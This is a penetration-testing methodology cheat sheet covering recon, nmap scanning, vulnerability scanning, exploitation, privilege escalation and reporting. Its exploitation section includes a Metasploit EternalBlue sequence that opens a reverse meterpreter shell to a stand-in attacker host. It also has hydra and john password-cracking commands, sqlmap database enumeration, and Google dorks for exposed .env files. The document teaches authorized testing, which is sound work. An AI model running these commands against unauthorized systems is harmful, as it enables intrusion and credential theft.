# Ethical Hacking Methodology

> Source: ethical-hacking-methodology

## Hacker Classifications

**White Hat (Ethical)** - Authorized security professionals conducting penetration testing with permission.
**Black Hat (Malicious)** - Unauthorized intrusions motivated by profit, revenge, or notoriety.
**Grey Hat (Hybrid)** - May cross ethical boundaries; often disclose vulnerabilities publicly.
**Other** - Script Kiddies, Hacktivists, Nation State actors, Coders/tool developers.

## Penetration Testing Lifecycle

| Stage | Purpose | Key Tools |
|-------|---------|-----------|
| Reconnaissance | Gather information | theHarvester, WHOIS, Google |
| Scanning | Enumerate targets | Nmap, Nikto, Gobuster |
| Exploitation | Gain access | Metasploit, SQLMap, Hydra |
| Maintaining Access | Persistence | Meterpreter, SSH keys |
| Reporting | Document findings | Report templates |

## Phase 1: Reconnaissance

### Passive Reconnaissance
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

### Google Hacking (OSINT)
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:** Files containing passwords, sensitive directories, web server detection, vulnerable servers, error messages, login portals.

### Social Media Reconnaissance
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

## Phase 2: Scanning

### Host Discovery
```bash
nmap -sn 192.168.1.0/24
arp-scan -l
nmap -sP 192.168.1.0/24
```

### Port Scanning
```bash
nmap -sS target.com       # TCP SYN scan (stealth)
nmap -sT target.com       # Full TCP connect scan
nmap -sU target.com       # UDP scan
nmap -p- target.com       # All ports scan
nmap -sV target.com       # Service detection
nmap -A target.com        # Aggressive scan
```

### Service Enumeration
```bash
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com
nmap --script=vuln target.com
```

### Common Port Reference

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

## Phase 3: Vulnerability Analysis

### Automated Scanning
```bash
nikto -h http://target.com
omp -u admin -w password --xml="<get_tasks/>"
nessuscli scan --target target.com
```

### OWASP Top 10 Areas
- SQL Injection, XSS, Broken Authentication, Security Misconfiguration
- Sensitive Data Exposure, XXE, Broken Access Control
- Insecure Deserialization, Known Vulnerable Components, Insufficient Logging

### Manual Techniques
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
whatweb target.com
```

## Phase 4: Exploitation

### Metasploit Framework
```bash
msfconsole
msf> search type:exploit name:smb
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip
msf> exploit
```

### Password Attacks
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Web Exploitation
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
```

## Phase 5: Maintaining Access & Privilege Escalation

### Privilege Escalation
```bash
# Linux
linpeas.sh
linux-exploit-suggester.sh
find / -perm -4000 2>/dev/null
sudo -l

# Windows
winpeas.exe
windows-exploit-suggester.py
```

### Post-Exploitation
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

## Phase 6: Reporting

### Report Structure
1. **Executive Summary** - High-level findings, business impact, risk ratings, remediation priorities
2. **Technical Findings** - Vulnerability details, proof of concept, screenshots/evidence, affected systems
3. **Risk Ratings** - Critical (immediate), High (24-48h), Medium (1 week), Low (1 month), Informational
4. **Remediation Recommendations** - Specific fixes, short-term mitigations, long-term solutions
5. **Appendices** - Detailed scan outputs, tool configurations, testing timeline, scope and methodology

## Common Attack Types

**Phishing** - Email-based credential theft, fake login pages, malicious attachments.
**Malware** - Virus, Worm, Trojan, Ransomware, Rootkit, Spyware.
**Network Attacks** - MITM, ARP Spoofing, DNS Poisoning, DDoS.

## Ethical Guidelines

- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality
- Never use findings for personal gain
